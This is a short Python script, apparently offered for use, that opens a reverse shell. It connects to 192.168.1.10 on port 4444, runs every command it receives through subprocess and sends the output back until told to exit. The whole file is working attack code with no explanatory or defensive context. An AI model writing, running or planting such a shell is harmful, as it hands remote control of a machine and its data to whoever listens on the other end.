import socket
import subprocess

def reverse_shell(host, port):
    s = socket.socket()
    s.connect((host, port))
    while True:
        cmd = s.recv(1024).decode()
        if cmd.lower() == "exit":
            break
        output = subprocess.getoutput(cmd)
        s.send(output.encode())
    s.close()

reverse_shell("192.168.1.10", 4444)
